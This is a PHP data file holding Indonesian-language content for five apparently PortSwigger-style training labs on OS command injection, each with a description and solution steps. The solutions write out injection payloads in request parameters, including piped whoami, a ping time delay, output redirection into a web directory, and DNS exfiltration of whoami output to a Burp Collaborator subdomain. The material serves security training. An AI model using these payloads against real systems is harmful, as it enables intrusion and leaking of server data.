<?php

return [
    '2b08de150e353dc1c0057519f466a55a0ca4a7901b2469d56ef7d2a80eddeaa6' => [
        'title' => 'OS command injection, kasus sederhana',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan OS command injection pada fitur pemeriksa stok produk.
        </p><p>
            Aplikasi menjalankan perintah shell yang berisi ID produk dan ID toko dari input pengguna, lalu mengembalikan keluaran mentah perintah tersebut pada responsnya.
        </p><p>
            Untuk menyelesaikan lab ini, jalankan perintah <code>whoami</code> untuk mengetahui nama pengguna sistem saat ini.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang memeriksa jumlah stok.
                    </li>
                    <li>
                        Ubah parameter <code>storeID</code> menjadi bernilai <code>1|whoami</code>.
                    </li>
                    <li>
                        Amati bahwa respons memuat nama pengguna sistem saat ini.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '28bda028c1ba840a8f4fccaaad3739fdc8d8e2d195f348c0db992cbcd6971cbf' => [
        'title' => 'Blind OS command injection dengan time delay',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind OS command injection pada fungsi umpan balik (feedback).
        </p><p>
            Aplikasi menjalankan perintah shell yang berisi detail kiriman pengguna, tetapi keluaran perintah tidak dikembalikan pada respons.
        </p><p>
            Untuk menyelesaikan lab ini, eksploitasi kerentanan blind OS command injection agar menghasilkan jeda waktu selama 10 detik.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan pengiriman umpan balik.
                    </li>
                    <li>
                        <p>
                            Ubah parameter <code>email</code> menjadi:
                        </p>
                        <code class="code-scrollable">email=x||ping+-c+10+127.0.0.1||</code>
                    </li>
                    <li>
                        Amati bahwa respons membutuhkan waktu 10 detik sebelum kembali.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '794c7ab29027c16b9a3fab84326c6f313a8af27a96f1833828edd38b26a4aca7' => [
        'title' => 'Blind OS command injection dengan pengalihan output',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind OS command injection pada fungsi umpan balik.
        </p><p>
            Aplikasi menjalankan perintah shell yang berisi detail kiriman pengguna. Keluaran perintah tidak ditampilkan dalam respons, tetapi Anda dapat mengalihkan output ke sebuah file. Terdapat direktori yang dapat ditulisi di:
        </p><code class="code-scrollable">/var/www/images/</code><p>
            Aplikasi menyajikan gambar katalog produk dari lokasi ini. Anda dapat mengalihkan keluaran perintah yang disuntikkan ke sebuah file di folder tersebut, lalu memanfaatkan URL pemuatan gambar untuk membaca isinya.
        </p><p>
            Untuk menyelesaikan lab ini, jalankan perintah <code>whoami</code> dan ambil keluarannya.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan pengiriman umpan balik.
                    </li>
                    <li>
                        <p>
                            Ubah parameter <code>email</code> menjadi:
                        </p>
                        <code class="code-scrollable">email=||whoami&gt;/var/www/images/output.txt||</code>
                    </li>
                    <li>
                        Sekarang gunakan Burp Suite untuk mencegat dan memodifikasi permintaan yang memuat gambar produk.
                    </li>
                    <li>
                        <p>
                            Ubah parameter <code>filename</code> menjadi nama file tempat Anda menyimpan keluaran perintah yang disuntikkan:
                        </p>
                        <code class="code-scrollable">filename=output.txt</code>
                    </li>
                    <li>
                        Amati bahwa respons menampilkan keluaran dari perintah yang disuntikkan.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
    '6e6e115e1981ae822b7e41fcaccbc1cb96a5d85b63b42b80e3e6d35565209752' => [
        'title' => 'Blind OS command injection dengan interaksi out-of-band',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind OS command injection pada fungsi umpan balik.
        </p><p>
            Aplikasi menjalankan perintah shell yang berisi detail kiriman pengguna secara asinkron sehingga tidak memengaruhi respons aplikasi. Anda tidak dapat mengalihkan keluaran ke lokasi yang bisa diakses langsung, tetapi Anda dapat memicu interaksi out-of-band ke domain eksternal.
        </p><p>
            Untuk menyelesaikan lab ini, eksploitasi blind OS command injection agar mengirim DNS lookup ke Burp Collaborator.
        </p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Untuk mencegah platform Academy dipakai menyerang pihak ketiga, firewall kami memblokir interaksi dari lab ke sistem eksternal sembarangan. Untuk menyelesaikan lab ini, Anda harus memakai server publik bawaan Burp Collaborator.
            </p>
        </div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite untuk mencegat dan memodifikasi permintaan pengiriman umpan balik.
                    </li>
                    <li>
                        <p>
                            Ubah parameter <code>email</code> menjadi:
                        </p>
                        <code class="code-scrollable">email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||</code>
                    </li>
                    <li>
                        Klik kanan lalu pilih "Insert Collaborator payload" untuk menyisipkan subdomain Burp Collaborator pada bagian yang ditentukan di parameter <code>email</code>.
                    </li>
                </ol>
                <div class="highlightedarea">
                    <h4>Catatan</h4>
                    <p>
                        Solusi di atas sudah cukup untuk memicu DNS lookup dan menyelesaikan lab. Dalam kasus nyata, Anda memakai <a href="/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> untuk memastikan payload memang memicu DNS lookup. Lihat lab <a href="/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration">blind OS command injection dengan eksfiltrasi data out-of-band</a> sebagai contoh penerapannya.
                    </p>
                </div>
            </div></div>
LABHTML,
        ],
    ],
    '3c2c7dc2a5f53dc680195c18c290e82bc97c28f599414db388cf8cf96cb72bf5' => [
        'title' => 'Blind OS command injection dengan eksfiltrasi data out-of-band',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Lab ini memiliki kerentanan blind OS command injection pada fungsi umpan balik.
        </p><p>
            Aplikasi menjalankan perintah shell yang berisi detail kiriman pengguna secara asinkron sehingga tidak memengaruhi respons aplikasi. Anda tidak dapat mengalihkan keluaran ke lokasi yang dapat diakses langsung, tetapi dapat memicu interaksi out-of-band ke domain eksternal.
        </p><p>
            Untuk menyelesaikan lab ini, jalankan perintah <code>whoami</code> dan eksfiltrasi keluarannya lewat query DNS ke Burp Collaborator. Anda perlu memasukkan nama pengguna sistem saat ini untuk menuntaskan lab.
        </p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Untuk mencegah platform Academy dipakai menyerang pihak ketiga, firewall kami memblokir interaksi dari lab ke sistem eksternal sembarangan. Untuk menyelesaikan lab ini, Anda harus memakai server publik bawaan Burp Collaborator.
            </p>
        </div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Gunakan Burp Suite Professional untuk mencegat dan memodifikasi permintaan pengiriman umpan balik.
                    </li>
                    <li>
                        Buka tab <a href="/burp/documentation/desktop/tools/collaborator">Collaborator</a>.
                    </li>
                    <li>
                        Klik "Copy to clipboard" untuk menyalin payload Burp Collaborator unik ke clipboard Anda.
                    </li>
                    <li>
                        <p>
                            Ubah parameter <code>email</code> menjadi seperti berikut, lalu masukkan subdomain Burp Collaborator Anda pada tempatnya:
                        </p>
                        <code class="code-scrollable">email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||</code>
                    </li>
                    <li>
                        Kembali ke tab Collaborator dan klik "Poll now". Anda akan melihat sejumlah interaksi DNS yang dipicu aplikasi akibat payload tersebut. Jika belum ada interaksi yang muncul, tunggu beberapa detik lalu coba lagi karena perintah sisi server berjalan secara asinkron.
                    </li>
                    <li>
                        Perhatikan bahwa keluaran perintah Anda muncul di subdomain interaksi pada tab Collaborator. Nama domain lengkap yang dicari tercantum di tab Description.
                    </li>
                    <li>
                        Untuk menuntaskan lab, masukkan nama pengguna sistem saat ini.
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
];
